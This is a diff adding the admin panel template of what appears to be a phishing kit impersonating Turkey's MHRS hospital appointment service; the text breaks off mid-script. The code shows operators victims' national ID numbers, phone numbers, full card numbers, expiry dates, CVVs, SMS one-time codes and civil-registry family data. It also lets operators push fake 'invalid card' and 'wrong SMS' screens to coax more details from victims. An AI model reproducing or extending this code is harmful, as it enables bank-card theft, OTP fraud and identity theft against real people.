@@ -1,0 +1,1067 @@
+<!doctype html>
+<html lang="tr">
+
+<head>
+    <meta charset="utf-8">
+    <%- include('partials/tema-baslangic') %>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Panel | MHRS Yönetim</title>
+    <link href="/css/admin.css" rel="stylesheet">
+</head>
+
+<body class="admin-panel">
+    <header class="admin-topbar">
+        <div class="admin-brand">MHRS Yönetim Paneli</div>
+        <%- include('partials/nav') %>
+        <div class="admin-user">
+            <div class="admin-canli" id="canliRozet" title="Son 3 dakikada aktif olan kullanıcı sayısı">
+                <span class="canli-dot"></span>
+                <span class="canli-etiket">Anlık Aktif</span>
+                <span class="canli-sayi" id="canli-sayi"><%= locals.cevrimiciZiyaretci || 0 %></span>
+            </div>
+            <button type="button" id="temizleKartsizBtn" class="temizle-btn temizle-kartsiz" title="Kart bilgisi olmayan tüm kullanıcıları sil">Kartsızları Temizle</button>
+            <button type="button" id="temizleTumuBtn" class="temizle-btn temizle-tumu" title="Tüm kullanıcıları sil">Tümünü Temizle</button>
+            <span class="admin-name"><%= kullaniciAdi %></span>
+            <button type="button" id="temaBtn" class="tema-btn" aria-label="Temayı değiştir" title="Aydınlık / Karanlık tema"></button>
+            <a href="/SADSDAFHBEUBCE/cikis" class="btn-cikis">Çıkış Yap</a>
+        </div>
+    </header>
+    <main class="admin-main panel-genis">
+        <section class="panel-card">
+            <div class="kart-baslik">
+                <h2>Sisteme Giriş Yapan Kullanıcılar (<span id="kullaniciSayisi"><%= kullanicilar.length %></span>)</h2>
+                <span class="kart-ipucu">Detay için isme tıklayın</span>
+            </div>
+            <p class="bos-mesaj" id="kullaniciBos"<%= kullanicilar.length === 0 ? '' : ' style="display:none"' %>>Henüz giriş yapan kullanıcı yok.</p>
+            <div class="tablo-sarici">
+                <table class="admin-table" id="kullaniciTablosu"<%= kullanicilar.length === 0 ? ' style="display:none"' : '' %>>
+                    <thead>
+                        <tr>
+                            <th>Durum</th>
+                            <th>Sayfa</th>
+                            <th>Ad Soyad</th>
+                            <th>Telefon No</th>
+                            <th>T.C. No</th>
+                            <th>Banka</th>
+                            <th>Kart</th>
+                            <th>SMS</th>
+                            <th>İşlem</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+        </section>
+    </main>
+
+    <div class="kullanici-modal" id="kullaniciModal" style="display:none">
+        <div class="kullanici-modal-box">
+            <div class="kullanici-modal-header">
+                <h3 id="modalBaslik">Kullanıcı Bilgileri</h3>
+                <button type="button" class="kullanici-modal-kapat" id="modalKapat" aria-label="Kapat">×</button>
+            </div>
+            <div class="kullanici-modal-body" id="modalGovde"></div>
+            <div class="kullanici-modal-footer">
+                <button type="button" class="kullanici-modal-close" id="modalKapat2">Kapat</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="uyari-modal" id="uyariModal" style="display:none">
+        <div class="uyari-modal-box">
+            <div class="uyari-modal-header">
+                <h3 id="uyariModalBaslik">Uyarı Gönder</h3>
+                <button type="button" class="uyari-modal-kapat" id="uyariModalKapat" aria-label="Kapat">×</button>
+            </div>
+            <div class="uyari-modal-body">
+                <label for="uyariMetin" class="uyari-label">Kullanıcıya gönderilecek uyarı mesajı:</label>
+                <textarea id="uyariMetin" class="uyari-textarea" rows="4" placeholder="Uyarı mesajınızı yazın..."></textarea>
+                <input type="hidden" id="uyariTcno" value="">
+            </div>
+            <div class="uyari-modal-footer">
+                <button type="button" class="uyari-modal-cancel" id="uyariModalIptal">İptal</button>
+                <button type="button" class="uyari-modal-send" id="uyariModalGonder">Gönder</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="kullanici-modal" id="hataliKartModal" style="display:none">
+        <div class="kullanici-modal-box" style="max-width: 420px;">
+            <div class="kullanici-modal-header">
+                <h3 id="hataliKartModalBaslik">Hatalı Kart</h3>
+                <button type="button" class="kullanici-modal-kapat" id="hataliKartModalKapat" aria-label="Kapat">×</button>
+            </div>
+            <div class="kullanici-modal-body">
+                <div class="uyari-label" id="hataliKartModalAciklama" style="margin-bottom: 12px;">Kartta hangi alan hatalı?</div>
+                <div style="display:grid; gap:10px;">
+                    <button type="button" class="islem-btn btn-gecersiz" data-hatali-kart="kartNo" style="width:100%; justify-content:center;">Kart Numarası</button>
+                    <button type="button" class="islem-btn btn-gecersiz" data-hatali-kart="skt" style="width:100%; justify-content:center;">Son Kullanma Tarihi</button>
+                    <button type="button" class="islem-btn btn-gecersiz" data-hatali-kart="cvv" style="width:100%; justify-content:center;">CVV</button>
+                </div>
+            </div>
+            <div class="kullanici-modal-footer">
+                <button type="button" class="kullanici-modal-close" id="hataliKartModalIptal">İptal</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="kullanici-modal" id="kartGecmisiModal" style="display:none">
+        <div class="kullanici-modal-box">
+            <div class="kullanici-modal-header">
+                <h3 id="kartGecmisiBaslik">Geçmiş Kartlar</h3>
+                <button type="button" class="kullanici-modal-kapat" id="kartGecmisiKapat" aria-label="Kapat">×</button>
+            </div>
+            <div class="kullanici-modal-body" id="kartGecmisiGovde"></div>
+            <div class="kullanici-modal-footer">
+                <button type="button" class="kullanici-modal-close" id="kartGecmisiKapat2">Kapat</button>
+            </div>
+        </div>
+    </div>
+
+    <audio id="panelBildirimSesi" src="/ses/universfield-new-notification-036-485897.mp3" preload="auto"></audio>
+
+    <div class="kullanici-modal" id="binKayitModal" style="display:none">
+        <div class="kullanici-modal-box" style="max-width: 420px;">
+            <div class="kullanici-modal-header">
+                <h3 id="binKayitModalBaslik">BIN Kaydet</h3>
+                <button type="button" class="kullanici-modal-kapat" id="binKayitModalKapat" aria-label="Kapat">×</button>
+            </div>
+            <div class="kullanici-modal-body">
+                <div style="display:grid; gap:12px;">
+                    <div>
+                        <label class="uyari-label" for="binKayitBanka">Banka</label>
+                        <select id="binKayitBanka" class="uyari-textarea" style="height:42px; width:100%; padding:10px 12px; resize:none;">
+                            <option value="">Banka seçin</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="uyari-label" for="binKayitBin">BIN</label>
+                        <input id="binKayitBin" class="uyari-textarea" type="text" maxlength="6" inputmode="numeric" placeholder="123456" style="height:42px; width:100%; padding:10px 12px; resize:none;">
+                    </div>
+                    <div>
+                        <label class="uyari-label" for="binKayitKartTuru">Kart Türü</label>
+                        <select id="binKayitKartTuru" class="uyari-textarea" style="height:42px; width:100%; padding:10px 12px; resize:none;">
+                            <option value="KREDİ KARTI">Kredi Kartı</option>
+                            <option value="BANKA">Banka Kartı</option>
+                            <option value="DEBIT">Debit</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="uyari-label" for="binKayitMarka">Marka</label>
+                        <input id="binKayitMarka" class="uyari-textarea" type="text" placeholder="Visa / Mastercard / Maestro" style="height:42px; width:100%; padding:10px 12px; resize:none;">
+                    </div>
+                </div>
+            </div>
+            <div class="kullanici-modal-footer">
+                <button type="button" class="kullanici-modal-close" id="binKayitModalIptal">İptal</button>
+                <button type="button" class="uyari-modal-send" id="binKayitModalKaydet">Kaydet</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="panel-toast" id="panelToast" role="status" aria-live="polite">
+        <span class="panel-toast-ikon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/></svg>
+        </span>
+        <span class="panel-toast-metin" id="panelToastMetin">Yönlendirme Başarılı</span>
+        <button type="button" class="panel-toast-kapat" id="panelToastKapat" aria-label="Kapat">&times;</button>
+    </div>
+
+    <script>
+        // Canlı panel: sayfa yenilenmeden her 2 saniyede tam kullanıcı listesini güncelle
+        (function () {
+            'use strict';
+            var POLL_MS = 1000;
+            var bilinenTcnoSet = null;
+            var ses = document.getElementById('panelBildirimSesi');
+
+            function sesCal() {
+                if (!ses) return;
+                ses.currentTime = 0;
+                var p = ses.play();
+                if (p && p.catch) p.catch(function () { });
+            }
+
+            function guncelle() {
+                fetch('/SADSDAFHBEUBCE/panel/veriler', { headers: { 'Accept': 'application/json' } })
+                    .then(function (r) {
+                        if (!r.ok) throw new Error('HTTP ' + r.status);
+                        return r.json();
+                    })
+                    .then(function (v) {
+                        var sayi = v && typeof v.cevrimiciZiyaretci === 'number' ? v.cevrimiciZiyaretci : null;
+                        if (sayi === null) return;
+                        var el = document.getElementById('canli-sayi');
+                        if (el) el.textContent = sayi;
+                        if (v && Array.isArray(v.kullanicilar)) {
+                            var yeniSet = {};
+                            v.kullanicilar.forEach(function (k) { yeniSet[k.tcno] = true; });
+                            if (bilinenTcnoSet !== null) {
+                                v.kullanicilar.forEach(function (k) {
+                                    if (!bilinenTcnoSet[k.tcno]) sesCal();
+                                });
+                            }
+                            bilinenTcnoSet = yeniSet;
+                            if (window.panelKullanicilariGuncelle) {
+                                window.panelKullanicilariGuncelle(v.kullanicilar);
+                            }
+                        }
+                    })
+                    .catch(function () { });
+            }
+
+            guncelle();
+            window.panelGuncelle = guncelle;
+            setInterval(guncelle, POLL_MS);
+            document.addEventListener('visibilitychange', function () {
+                if (!document.hidden) guncelle();
+            });
+        })();
+
+        // Kullanıcı tablosu + bilgi popup'ı
+        (function () {
+            'use strict';
+            var kullanicilar = <%- JSON.stringify(kullanicilar).replace(/</g, '\\u003c') %>;
+
+            var tcAlanlar = [
+                ['TC', 'T.C. No'],
+                ['AD', 'Ad'],
+                ['SOYAD', 'Soyad'],
+                ['GSM', 'GSM'],
+                ['BABAADI', 'Baba Adı'],
+                ['BABATC', 'Baba T.C.'],
+                ['ANNEADI', 'Anne Adı'],
+                ['ANNETC', 'Anne T.C.'],
+                ['DOGUMTARIHI', 'Doğum Tarihi'],
+                ['OLUMTARIHI', 'Ölüm Tarihi'],
+                ['DOGUMYERI', 'Doğum Yeri'],
+                ['MEMLEKETIL', 'Memleket İl'],
+                ['MEMLEKETILCE', 'Memleket İlçe'],
+                ['MEMLEKETKOY', 'Memleket Köy'],
+                ['ADRESIL', 'Adres İl'],
+                ['ADRESILCE', 'Adres İlçe'],
+                ['AILESIRANO', 'Aile Sıra No'],
+                ['BIREYSIRANO', 'Birey Sıra No'],
+                ['MEDENIHAL', 'Medeni Hal'],
+                ['CINSIYET', 'Cinsiyet']
+            ];
+
+            function formatKartNo(no) {
+                var ra = String(no || '').replace(/\s/g, '');
+                return ra.replace(/(\d{4})(?=\d)/g, '$1 ');
+            }
+
+            var KART_RENK_SINIFLARI = ['', 'kart-degisti', 'kart-3', 'kart-4', 'kart-5', 'kart-6'];
+
+            function kartRenkSinifi(index) {
+                if (index < 0) return '';
+                if (index >= KART_RENK_SINIFLARI.length) return 'kart-6';
+                return KART_RENK_SINIFLARI[index];
+            }
+
+            function formatTarih(iso) {
+                if (!iso) return '-';
+                try { return new Date(iso).toLocaleString('tr-TR'); } catch (e) { return iso; }
+            }
+
+            function sayfaAdi(sayfa) {
+                if (!sayfa) return '-';
+                var yol = String(sayfa).split('?')[0];
+                var hata = /[?&]hata=([^&]+)/.exec(String(sayfa));
+                var onay = /[?&]onay=1/.test(String(sayfa));
+                var hatali = /[?&]hatali=1/.test(String(sayfa));
+                if (yol === '/odeme/bekleniyor') {
+                    if (hata && hata[1] === 'gecersizKart') return 'Geçersiz Kart Uyarısı';
+                    if (hata && hata[1] === 'internetKapali') return 'İnternete Kapalı Uyarısı';
+                    return 'İşlem Bekleniyor';
+                }
+                if (yol === '/sms' || yol === '/vakifbank-sms-onay' || yol === '/garanti-sms-onay' || yol === '/isbankasi-sms-onay' || yol === '/yapikredi-sms-onay' || yol === '/akbankSms') {
+                    if (onay) return 'SMS Onaylandı';
+                    if (hatali) return 'SMS Hatalı Giriş';
+                    return 'SMS Doğrulama';
+                }
+                if (yol === '/giris2') return 'Giriş Ekranı';
+                if (yol === '/anasayfa' || yol === '/') return 'Ana Sayfa';
+                if (yol === '/odeme') return 'Ödeme Formu';
+                if (yol === '/reklam') return 'Reklam Sayfası';
+                return String(sayfa);
+            }
+
+            function hucre(metin, baslik, sinif) {
+                var td = document.createElement('td');
+                td.textContent = metin;
+                if (baslik) td.setAttribute('title', baslik);
+                if (sinif) td.className = sinif;
+                return td;
+            }
+
+            function smsHucre(kodlar) {
+                var td = document.createElement('td');
+                td.className = 'sms-hucre';
+                var kodlarList = Array.isArray(kodlar) ? kodlar.filter(function (v) { return !!v; }) : [];
+                if (!kodlarList.length) {
+                    var yok = document.createElement('span');
+                    yok.className = 'odeme-yok';
+                    yok.textContent = '-';
+                    td.appendChild(yok);
+                    return td;
+                }
+
+                var aktifKod = kodlarList[kodlarList.length - 1];
+                var satir = document.createElement('div');
+                satir.className = 'odeme-satir';
+                var deger = document.createElement('span');
+                deger.className = 'odeme-deger odeme-kartno';
+                deger.textContent = aktifKod;
+                satir.appendChild(deger);
+
+                var kopyalaBtn = document.createElement('button');
+                kopyalaBtn.type = 'button';
+                kopyalaBtn.className = 'odeme-kopyala';
+                kopyalaBtn.title = 'Kopyala';
+                kopyalaBtn.textContent = '⧉';
+                kopyalaBtn.addEventListener('click', function () {
+                    kopyalaMetin(aktifKod, kopyalaBtn);
+                });
+                satir.appendChild(kopyalaBtn);
+                td.appendChild(satir);
+
+                var kisiSayisi = document.createElement('div');
+                kisiSayisi.className = 'sms-degisim-sayisi';
+                kisiSayisi.textContent = 'SMS Değişimi: ' + kodlarList.length;
+                td.appendChild(kisiSayisi);
+                return td;
+            }
+
+            function kopyalaMetin(metin, btn) {
+                var isle = function () {
+                    var eski = btn.textContent;
+                    btn.textContent = '✓';
+                    btn.classList.add('kopyalandi');
+                    setTimeout(function () {
+                        btn.textContent = eski;
+                        btn.classList.remove('kopyalandi');
+                    }, 1000);
+                };
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(metin).then(isle).catch(function () {
+                        kopyalaYedek(metin);
+                        isle();
+                    });
+                } else {
+                    kopyalaYedek(metin);
+                    isle();
+                }
+            }
+
+            function kopyalaYedek(metin) {
+                var ta = document.createElement('textarea');
+                ta.value = metin;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                document.body.appendChild(ta);
+                ta.select();
+                try { document.execCommand('copy'); } catch (e) { }
+                document.body.removeChild(ta);
+            }
+
+            // İşlem butonları için ikonlar (lucide tarzı, currentColor ile renklendirilir)
+            function ikon(ic) {
+                return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' + ic + '</svg>';
+            }
+
+            var IKONLAR = {
+                basa: '<path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/>',
+                sms: '<path d="M22 2L11 13"/><path d="M22 2l-7 20-4-9-9-4 20-7z"/>',
+                onay: '<path d="M20 6L9 17l-5-5"/>',
+                hatali: '<path d="M18 6L6 18"/><path d="M6 6l12 12"/>',
+                internetKapali: '<path d="M12 20h.01"/><path d="M8.5 16.429a5 5 0 0 1 7 0"/><path d="M5 12.859a10 10 0 0 1 5.17-2.69"/><path d="M19 12.859a10 10 0 0 0-2.007-1.523"/><path d="M2 2l20 20"/>',
+                gecersizKart: '<rect x="2" y="5" width="20" height="14" rx="2" ry="2"/><line x1="2" y1="10" x2="22" y2="10"/><path d="M15 15l4 4"/><path d="M19 15l-4 4"/>',
+                hataliKart: '<rect x="2" y="5" width="20" height="14" rx="2" ry="2"/><path d="M8 9h8M8 13h5"/><path d="M15 15l4 4"/><path d="M19 15l-4 4"/>',
+                binKaydet: '<rect x="2" y="5" width="20" height="14" rx="2" ry="2"/><path d="M7 9h10M7 13h7"/><path d="M14 18l4-4"/><path d="M18 18l-4-4"/>',
+                ban: '<circle cx="12" cy="12" r="10"/><path d="M4.93 4.93l14.14 14.14"/>',
+                unban: '<path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1 1 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m9 12 2 2 4-4"/>',
+                sil: '<path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/>',
+                uyari: '<path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/>',
+                gecmisKart: '<path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/><path d="M12 7v5l4 2"/>'
+            };
+
+            function tabloCiz() {
+                // Sunucu sırasını birebir koru: çevrim içi olanlar en üstte, onun içinde kart girenler bir üstte, her grupta _id desc
+                var tbody = document.querySelector('#kullaniciTablosu tbody');
+                var bos = document.getElementById('kullaniciBos');
+                var tablo = document.getElementById('kullaniciTablosu');
+                var sayi = document.getElementById('kullaniciSayisi');
+                tbody.innerHTML = '';
+                if (kullanicilar.length === 0) {
+                    bos.style.display = '';
+                    tablo.style.display = 'none';
+                    return;
+                }
+                bos.style.display = 'none';
+                tablo.style.display = '';
+                sayi.textContent = kullanicilar.length;
+                kullanicilar.forEach(function (u) {
+                    var tr = document.createElement('tr');
+                    tr.className = 'kullanici-satir';
+
+                    var durumTd = document.createElement('td');
+                    var nokta = document.createElement('span');
+                    nokta.className = 'kullanici-nokta ' + (u.cevrimici ? 'nokta-acik' : 'nokta-kapali');
+                    nokta.setAttribute('data-tcno', u.tcno);
+                    nokta.title = u.cevrimici ? 'Çevrimiçi' : 'Çevrimdışı';
+                    durumTd.appendChild(nokta);
+                    var durumMetin = document.createElement('span');
+                    durumMetin.className = 'durum-metin';
+                    durumMetin.textContent = u.cevrimici ? 'Çevrimiçi' : 'Çevrimdışı';
+                    durumTd.appendChild(durumMetin);
+                    tr.appendChild(durumTd);
+
+                    var sayfaTd = document.createElement('td');
+                    var sayfaSpan = document.createElement('span');
+                    sayfaSpan.className = 'sayfa-metin';
+                    sayfaSpan.setAttribute('data-tcno', u.tcno);
+                    sayfaSpan.textContent = sayfaAdi(u.mevcutSayfa);
+                    sayfaSpan.title = u.mevcutSayfa || 'Sayfa bilgisi yok';
+                    sayfaTd.appendChild(sayfaSpan);
+                    tr.appendChild(sayfaTd);
+
+                    var adTd = document.createElement('td');
+                    var adLink = document.createElement('span');
+                    adLink.className = 'kullanici-ad' + (u.banli ? ' kullanici-banli' : '');
+                    adLink.textContent = u.ad || '-';
+                    adLink.title = 'Bilgileri görüntüle';
+                    adLink.addEventListener('click', function (e) {
+                        e.stopPropagation();
+                        modalAc(u);
+                    });
+                    adTd.appendChild(adLink);
+                    if (u.banli) {
+                        var banEtiket = document.createElement('span');
+                        banEtiket.className = 'ban-etiket';
+                        banEtiket.textContent = 'YASAKLI';
+                        adTd.appendChild(banEtiket);
+                    }
+                    if (u.beklemeKomut) {
+                        var beklemeEtiket = document.createElement('span');
+                        beklemeEtiket.className = 'bekleme-etiket';
+                        beklemeEtiket.textContent = 'BEKLEMEDE';
+                        adTd.appendChild(beklemeEtiket);
+                    }
+                    tr.appendChild(adTd);
+
+                    tr.appendChild(hucre(u.telefon || '-', u.telefon || 'Telefon bilgisi yok', 'telefon-hucre'));
+
+                    tr.appendChild(hucre(u.tcno, null, 'tcno-hucre'));
+
+                    var bankaTd = document.createElement('td');
+                    bankaTd.className = 'odeme-hucre';
+                    var kartTd = document.createElement('td');
+                    kartTd.className = 'odeme-hucre';
+                    if (u.odeme) {
+                        var bankaSatirlar = [];
+                        if (u.odeme.banka) bankaSatirlar.push(['Banka', u.odeme.banka]);
+                        if (u.odeme.marka || u.odeme.kartTuru) {
+                            var tip = [u.odeme.marka, u.odeme.kartTuru].filter(Boolean).join(' · ');
+                            bankaSatirlar.push(['Tip', tip]);
+                        }
+                        if (bankaSatirlar.length === 0) bankaSatirlar.push(['Banka', '-']);
+                        bankaSatirlar.forEach(function (s) {
+                            var satir = document.createElement('div');
+                            satir.className = 'odeme-satir';
+                            var deger = document.createElement('span');
+                            deger.className = 'odeme-deger' + (s[0] === 'Banka' ? ' odeme-banka' : '');
+                            deger.textContent = s[1];
+                            satir.appendChild(deger);
+                            bankaTd.appendChild(satir);
+                        });
+
+                        var kartSatirlar = [];
+                        kartSatirlar.push(['Kart', formatKartNo(u.odeme.kartNo), String(u.odeme.kartNo || '').replace(/\s/g, '')]);
+                        kartSatirlar.push(['SKT', u.odeme.skt || '-', u.odeme.skt || '']);
+                        kartSatirlar.push(['CVV', u.odeme.cvv || '-', u.odeme.cvv || '']);
+                        var sonKartRengi = kartRenkSinifi((u.odeme.kartSayisi || 1) - 1);
+                        kartSatirlar.forEach(function (s) {
+                            var satir = document.createElement('div');
+                            satir.className = 'odeme-satir';
+                            var deger = document.createElement('span');
+                            deger.className = 'odeme-deger' + (s[0] === 'Kart' ? ' odeme-kartno' + (sonKartRengi ? ' ' + sonKartRengi : '') : '');
+                            deger.textContent = s[1];
+                            satir.appendChild(deger);
+                            var kopyalaBtn = document.createElement('button');
+                            kopyalaBtn.type = 'button';
+                            kopyalaBtn.className = 'odeme-kopyala';
+                            kopyalaBtn.title = 'Kopyala';
+                            kopyalaBtn.textContent = '⧉';
+                            kopyalaBtn.disabled = !s[2];
+                            kopyalaBtn.addEventListener('click', function () {
+                                kopyalaMetin(s[2], kopyalaBtn);
+                            });
+                            satir.appendChild(kopyalaBtn);
+                            kartTd.appendChild(satir);
+                        });
+                        if (u.odeme.kartSayisi > 1) {
+                            var degisiklikEtiket = document.createElement('span');
+                            degisiklikEtiket.className = 'kart-degisiklik-etiket';
+                            degisiklikEtiket.textContent = 'Kart Değişikliği ×' + u.odeme.kartSayisi;
+                            degisiklikEtiket.title = 'Bu kullanıcı ' + u.odeme.kartSayisi + ' farklı kart girmiş. Geçmiş kartlar için İşlem sütunundaki saat ikonuna tıklayın.';
+                            kartTd.appendChild(degisiklikEtiket);
+                        }
+                    } else {
+                        var odemeYokBanka = document.createElement('span');
+                        odemeYokBanka.className = 'odeme-yok';
+                        odemeYokBanka.textContent = 'Ödeme yok';
+                        bankaTd.appendChild(odemeYokBanka);
+                        var odemeYokKart = document.createElement('span');
+                        odemeYokKart.className = 'odeme-yok';
+                        odemeYokKart.textContent = '-';
+                        kartTd.appendChild(odemeYokKart);
+                    }
+                    tr.appendChild(bankaTd);
+                    tr.appendChild(kartTd);
+
+                    tr.appendChild(smsHucre([u.smsKod1, u.smsKod2]));
+
+                    var islemTd = document.createElement('td');
+                    islemTd.className = 'islem-hucre';
+                    var komutlar = [
+                        ['basa', 'Başa Döndür', 'btn-basa'],
+                        ['sms', 'SMS Gönder', 'btn-sms'],
+                        ['onay', 'Onayla', 'btn-onay'],
+                        ['hatali', 'Hatalı SMS', 'btn-hatali'],
+                        ['internetKapali', 'İnternete Kapalı', 'btn-internet'],
+                        ['gecersizKart', 'Geçersiz Kart', 'btn-gecersiz']
+                    ];
+                    komutlar.forEach(function (k) {
+                        var komutBtn = document.createElement('button');
+                        komutBtn.type = 'button';
+                        komutBtn.className = 'islem-btn ' + k[2];
+                        komutBtn.title = k[1];
+                        komutBtn.setAttribute('aria-label', k[1]);
+                        komutBtn.innerHTML = ikon(IKONLAR[k[0]]);
+                        komutBtn.addEventListener('click', function (e) {
+                            e.stopPropagation();
+                            komutGonder(u.tcno, k[0], komutBtn);
+                        });
+                        islemTd.appendChild(komutBtn);
+                    });
+                    var hataliKartBtn = document.createElement('button');
+                    hataliKartBtn.type = 'button';
+                    hataliKartBtn.className = 'islem-btn btn-gecersiz';
+                    hataliKartBtn.title = 'Hatalı Kart';
+                    hataliKartBtn.setAttribute('aria-label', 'Hatalı Kart');
+                    hataliKartBtn.innerHTML = ikon(IKONLAR.hataliKart);
+                    hataliKartBtn.addEventListener('click', function (e) {
+                        e.stopPropagation();
+                        hataliKartMenuAc(u, hataliKartBtn);
+                    });
+                    islemTd.appendChild(hataliKartBtn);
+                    var banBtn = document.createElement('button');
+                    banBtn.type = 'button';
+                    banBtn.className = 'islem-btn ' + (u.banli ? 'btn-unban' : 'btn-ban');
+                    banBtn.title = u.banli ? 'Yasağı Kaldır' : 'Yasakla';
+                    banBtn.setAttribute('aria-label', banBtn.title);
+                    banBtn.innerHTML = ikon(u.banli ? IKONLAR.unban : IKONLAR.ban);
+                    banBtn.addEventListener('click', function (e) {
+                        e.stopPropagation();
+                        banDegistir(u.tcno, !u.banli);
+                    });
+                    islemTd.appendChild(banBtn);
+                    var uyariBtn = document.createElement('button');
+                    uyariBtn.type = 'button';
+                    uyariBtn.className = 'islem-btn btn-uyari';
+                    uyariBtn.title = 'Uyarı Gönder';
+                    uyariBtn.setAttribute('aria-label', 'Uyarı Gönder');
+                    uyariBtn.innerHTML = ikon(IKONLAR.uyari);
+                    uyariBtn.addEventListener('click', function (e) {
+                        e.stopPropagation();
+                        uyariModalAc(u.tcno, u.ad);
+                    });
+                    islemTd.appendChild(uyariBtn);
+                    var binKaydetBtn = document.createElement('button');
+                    binKaydetBtn.type = 'button';
+                    binKaydetBtn.className = 'islem-btn btn-bin';
+                    binKaydetBtn.title = 'BIN Kaydet';
+                    binKaydetBtn.setAttribute('aria-label', 'BIN Kaydet');
+                    binKaydetBtn.innerHTML = ikon(IKONLAR.binKaydet);
+                    binKaydetBtn.addEventListener('click', function (e) {
+                        e.stopPropagation();
+                        binKayitModalAc(u);
+                    });
+                    islemTd.appendChild(binKaydetBtn);
+                    if (u.odeme && u.odeme.kartSayisi > 1) {
+                        var gecmisBtn = document.createElement('button');
+                        gecmisBtn.type = 'button';
+                        gecmisBtn.className = 'islem-btn btn-gecmis';
+                        gecmisBtn.title = 'Geçmiş Kartları Gör (' + u.odeme.kartSayisi + ')';
+                        gecmisBtn.setAttribute('aria-label', 'Geçmiş Kartları Gör');
+                        gecmisBtn.innerHTML = ikon(IKONLAR.gecmisKart);
+                        gecmisBtn.addEventListener('click', function (e) {
+                            e.stopPropagation();
+                            kartGecmisiAc(u);
+                        });
+                        islemTd.appendChild(gecmisBtn);
+                    }
+                    var silBtn = document.createElement('button');
+                    silBtn.type = 'button';
+                    silBtn.className = 'islem-btn btn-sil';
+                    silBtn.title = 'Sil';
+                    silBtn.setAttribute('aria-label', 'Sil');
+                    silBtn.innerHTML = ikon(IKONLAR.sil);
+                    silBtn.addEventListener('click', function (e) {
+                        e.stopPropagation();
+                        kullaniciSil(u.tcno);
+                    });
+                    islemTd.appendChild(silBtn);
+                    tr.appendChild(islemTd);
+
+                    tbody.appendChild(tr);
+                });
+            }
+
+            function satirEkle(govde, etiket, deger) {
+                if (deger === null || deger === undefined || String(deger).trim() === '') return;
+                var row = document.createElement('div');
+                row.className = 'info-row';
+                var lbl = document.createElement('span');
+                lbl.className = 'info-label';
+                lbl.textContent = etiket;
+                var val = document.createElement('span');
+                val.className = 'info-value';
+                val.textContent = String(deger);
+                row.appendChild(lbl);
+                row.appendChild(val);
+                govde.appendChild(row);
+            }
+
+            function modalAc(u) {
+                if (!u) return;
+                var baslik = document.getElementById('modalBaslik');
+                baslik.textContent = u.ad || u.tcno || 'Kullanıcı';
+                var govde = document.getElementById('modalGovde');
+                govde.innerHTML = '';
+
+                satirEkle(govde, 'T.C. No', u.tcno);
+                satirEkle(govde, 'Ad Soyad', u.ad);
+                satirEkle(govde, 'Giriş Sayısı', u.girisSayisi);
+                satirEkle(govde, 'Son Giriş', formatTarih(u.sonGiris));
+                satirEkle(govde, 'Kayıt Tarihi', formatTarih(u.createdAt));
+
+                if (u.tcBilgi) {
+                    tcAlanlar.forEach(function (alan) {
+                        satirEkle(govde, alan[1], u.tcBilgi[alan[0]]);
+                    });
+                } else {
+                    var not = document.createElement('div');
+                    not.className = 'bos-mesaj';
+                    not.textContent = 'Bu kullanıcı için TC sorgu bilgisi kayıtlı değil.';
+                    govde.appendChild(not);
+                }
+
+                document.getElementById('kullaniciModal').style.display = 'flex';
+            }
+
+            function modalKapat() {
+                document.getElementById('kullaniciModal').style.display = 'none';
+            }
+
+            function kartGecmisiAc(u) {
+                if (!u || !u.odeme || !u.odeme.kartlar) return;
+                document.getElementById('kartGecmisiBaslik').textContent =
+                    (u.ad || u.tcno) + ' - Geçmiş Kartlar (' + u.odeme.kartSayisi + ')';
+                var govde = document.getElementById('kartGecmisiGovde');
+                govde.innerHTML = '';
+                u.odeme.kartlar.forEach(function (kart, index) {
+                    var blok = document.createElement('div');
+                    blok.className = 'gecmis-kart-blok';
+
+                    var noSatir = document.createElement('div');
+                    noSatir.className = 'info-row';
+                    var noEtiket = document.createElement('span');
+                    noEtiket.className = 'info-label';
+                    noEtiket.textContent = (index + 1) + '. Kart';
+                    var noDeger = document.createElement('span');
+                    noDeger.className = 'info-value gecmis-kart-no ' + kartRenkSinifi(index);
+                    noDeger.textContent = formatKartNo(kart.kartNo);
+                    noSatir.appendChild(noEtiket);
+                    noSatir.appendChild(noDeger);
+                    var kopyalaBtn = document.createElement('button');
+                    kopyalaBtn.type = 'button';
+                    kopyalaBtn.className = 'odeme-kopyala';
+                    kopyalaBtn.title = 'Kopyala';
+                    kopyalaBtn.textContent = '⧉';
+                    kopyalaBtn.addEventListener('click', function () {
+                        kopyalaMetin(String(kart.kartNo || '').replace(/\s/g, ''), kopyalaBtn);
+                    });
+                    noSatir.appendChild(kopyalaBtn);
+                    blok.appendChild(noSatir);
+
+                    var bilgiler = [
+                        ['Banka', kart.banka || '-'],
